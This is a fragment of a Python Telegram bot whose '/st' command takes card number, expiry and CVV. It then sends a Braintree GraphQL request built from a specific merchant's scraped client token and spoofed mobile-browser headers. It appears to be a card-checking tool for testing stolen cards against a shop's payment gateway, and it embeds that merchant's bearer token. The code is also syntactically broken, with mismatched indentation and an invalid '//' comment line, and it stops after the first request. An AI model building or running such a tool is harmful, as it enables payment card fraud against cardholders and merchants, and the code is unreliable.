from aiogram import Router, types
from aiogram.filters import Command
import requests

router = Router()

@router.message(Command("st"))
async def st_handler(msg: types.Message):
  args = msg.text.split(" ", maxsplit=1)
    if len(args) < 2:
        return await msg.answer("❌ Formato incorrecto.\nEjemplo: /st 4111111111111111|12|2026|123")

    try:
        numero, mes, ano, cvv = args[1].strip().split("|")
    except ValueError:
        return await msg.answer("❌ Debes enviar los 4 datos separados por `|`", parse_mode="Markdown")

    await msg.answer("🔄 Procesando...")


    try:

      //////////// REQ 1 
      headers = {
      'authority': 'payments.braintree-api.com',
      'accept': '*/*',
      'accept-language': 'es-CL,es-419;q=0.9,es;q=0.8',
      'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDk0NDUwMjAsImp0aSI6IjhlNGFiMDZjLWYyOTEtNGUwOS1hZDQ1LWQ0ZDdkNTAxNWZkMiIsInN1YiI6IjhzeGh2NXlwcWdndDNodzQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjhzeGh2NXlwcWdndDNodzQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.ElTwR9axXZ8tWeLBqFyO2xT4FblnXu90hFcAwoQzmp7UciEngTFkpzWfdwtNED8mbbmvBMgIGZauSQAjYpsWvg',
      'braintree-version': '2018-05-10',
      'content-type': 'application/json',
      'origin': 'https://www.stovercompany.com',
      'referer': 'https://www.stovercompany.com/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
      }

      json_data = {
          'clientSdkMetadata': {
              'source': 'client',
              'integration': 'custom',
              'sessionId': '64d9ac8d-6579-41cc-b70b-a70f69617793',
          },
          'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
          'operationName': 'ClientConfiguration',
      }

      response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)


